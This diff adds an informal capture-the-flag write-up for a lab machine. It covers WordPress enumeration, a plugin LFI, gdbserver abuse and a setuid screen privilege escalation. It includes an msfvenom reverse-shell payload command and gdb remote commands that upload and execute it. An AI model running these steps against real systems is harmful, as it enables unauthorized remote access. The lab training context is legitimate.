@@ -1,0 +1,30 @@
+Ah so we have returned...
+
+
+Due to some technical issues, all of my previous notes were deleted, inlcuding the notes for this box... (I did salvage a few though so I guess that's good)  Some steps were taken to avoid this in the future, hopefully it all pans out.
+
+
+Anyways, for this box, I remember that there was a wordpress site in which wp-scan didn't provide the needed info, this prompted me to do some research into how exactly to manually enum a WP site, which led to me locating a "pdf-reader" add on that was installed on this box.  Some more research led to me discovering an LFI vuln with this, and I ended up creating a (very bad) script to enum the /proc filesystem.  This eventually led to me discovering there was a gdb server running on port 1337 (thanks to some handy greps on all the files), which is promptly where the issues started.
+
+
+ok so it looks like I got the exploit - maybe?  But the port keeps getting closed, I checked the fourms and yeah, looks to be a common issue.  Just gonna have to test when I get a chance I guess
+------------------------------------
+
+so to get user I had to follow these steps.  (from a vid and hacktricks):
+
+
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.22 LPORT=4444 PrependFork=true -f elf -o binary.elf
+
+target extended-remote 10.10.11.125:1337
+
+remote put binary.elf binary2.elf
+
+set remote exec-file binary2.elf
+
+
+with this I got a shell lmao, that was awful -> the exploit I found earlier was useless
+
+On the box (pain in the ass b/c it kept needing to be reset) I enumerated a bit, the mysql DB had an admin has but I didn't bother to crack it (lazy + crappy hardware).  I kept looking for quick wins but it was tough due to the bad shell and no password for the user.  Eventually, I thought to run one of the commands on my notecards (to find files with the sticky bit set) and this led to finding the /usr/bin/screen file, and a quick read through of the manpage let me get root!
+
+GG
